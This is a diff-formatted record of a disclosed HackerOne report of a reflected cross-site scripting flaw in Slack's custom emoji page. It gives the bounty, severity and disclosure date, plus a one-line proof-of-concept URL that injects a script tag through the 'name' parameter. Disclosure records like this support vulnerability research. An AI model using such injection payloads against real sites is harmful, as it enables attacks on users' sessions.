@@ -1,0 +1,15 @@
+ReportLink:https://hackerone.com/reports/258198
+WeaknessName:Cross-site Scripting (XSS) - Reflected
+Reporter:https://hackerone.com/co3k
+ReportedTo:Slack(slack)
+BountyAmount:1250.0
+Severity:high
+State:Closed
+DateOfDisclosure:24.09.2017 6:40:12
+
+Summary:
+
+The Custom Emoji Page has a Reflected XSS in building flash message.
+
+The following is the PoC.
+https://{team}.slack.com/customize/emoji?added=1&name=vuln"><script>alert(0);<%2Fscript>
